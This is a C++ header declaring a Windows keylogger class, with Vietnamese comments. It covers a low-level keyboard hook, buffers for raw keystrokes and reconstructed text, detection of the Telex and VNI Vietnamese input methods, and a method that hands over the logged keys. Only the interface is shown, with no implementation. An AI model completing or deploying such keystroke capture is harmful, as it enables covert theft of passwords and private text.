// =============================================================
// MODULE: KEYLOGGER (HEADER)
// Nhiệm vụ: Ghi lại phím bấm, phát hiện kiểu gõ (Telex/VNI)
//           và xử lý tiếng Việt (Unicode)
// =============================================================

#pragma once
#include <string>
#include <vector>
#include <mutex>
#include <thread>
#include <windows.h>

class Keylogger {
private:
    std::string _rawLogBuffer;   // Bộ đệm lưu phím thô (RAW KEY) - Vd: [SHIFT]A
    std::string _finalLogBuffer; // Bộ đệm lưu văn bản hoàn chỉnh (TEXT) - Vd: Xin chào

    std::string _detectedMode;      // Chế độ gõ phát hiện được: TELEX / VNI / Auto
    std::string _inputMethodStatus; // Trạng thái bộ gõ: Vietnamese (Unikey) / English
    DWORD _lastPhysicalKey;         // Mã phím vật lý cuối cùng (dùng để đoán kiểu gõ)

    bool _lastWasInjectedBackspace; // Cờ kiểm tra xem Backspace có phải do Unikey tự gửi không

    std::mutex _mutex;            // Khóa bảo vệ dữ liệu (Thread-safe)
    std::thread _loggerThread;    // Luồng chạy Hook bàn phím
    bool _isRunning;              // Trạng thái hoạt động
    HHOOK _hook;                  // Handle của Windows Hook
    DWORD _threadId;              // ID của luồng chứa Hook

    // Vòng lặp nhận thông điệp bàn phím (Message Loop)
    void RunHookLoop();

    // Xử lý logic chính: Chuyển mã phím -> Ký tự Unicode
    void ProcessKey(DWORD vkCode, DWORD scanCode, DWORD flags);

    // Phân tích xem người dùng đang gõ tiếng Việt hay tiếng Anh
    void AnalyzeInputMethod(DWORD vkCode, bool isInjected);

    // Chuyển đổi mã phím ảo sang chuỗi hiển thị (cho Raw Log)
    std::string MapVkToRawString(DWORD vkCode, bool isShift, bool isCaps);

    // Callback tĩnh nhận sự kiện từ Windows (Cầu nối vào class)
    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

public:
    Keylogger();
    ~Keylogger();

    void StartKeyLogging();       // Bắt đầu ghi
    void StopKeyLogging();        // Dừng ghi
    std::string GetLoggedKeys();  // Lấy dữ liệu và xóa bộ đệm
};